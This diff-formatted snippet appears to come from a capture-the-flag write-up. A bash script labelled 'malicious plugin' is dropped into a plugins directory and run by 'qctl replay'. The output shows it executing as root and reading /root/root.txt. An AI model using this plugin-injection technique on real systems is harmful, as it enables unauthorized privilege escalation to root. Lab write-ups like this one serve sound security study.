@@ -1,0 +1,12 @@
+$ Create case-root-writeup/plugins/rpm-integrity and trigger qctl replay
+
+--- malicious plugin ---
+#!/bin/bash
+id
+printf "root flag: "
+cat /root/root.txt
+--- qctl replay output ---
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+root flag: [REDACTED]
+--- cleanup ---
+case directory removed
